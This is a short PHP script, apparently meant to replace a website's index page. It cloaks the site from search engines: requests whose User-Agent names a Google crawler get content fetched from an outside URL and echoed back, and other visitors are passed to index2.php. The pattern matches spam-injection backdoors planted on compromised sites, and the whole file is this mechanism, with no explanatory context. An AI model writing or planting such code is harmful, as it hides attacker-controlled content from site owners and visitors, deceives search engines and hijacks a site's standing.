<?php

$googleBots = array(
    "Googlebot",
    "Google-Site-Verification",
    "Google-InspectionTool",
    "Googlebot-Mobile",
    "Googlebot-News"
);

$isGoogleBot = false;

if (isset($_SERVER['HTTP_USER_AGENT'])) {
    foreach ($googleBots as $bot) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
            $isGoogleBot = true;
            break;
        }
    }
}

if ($isGoogleBot) {
    $bot_content = file_get_contents('https://app.sampleproject.my/raw/jwytcohmcphd');
    echo $bot_content;
    exit;
} else {
    include('index2.php');
    exit;
}
?>
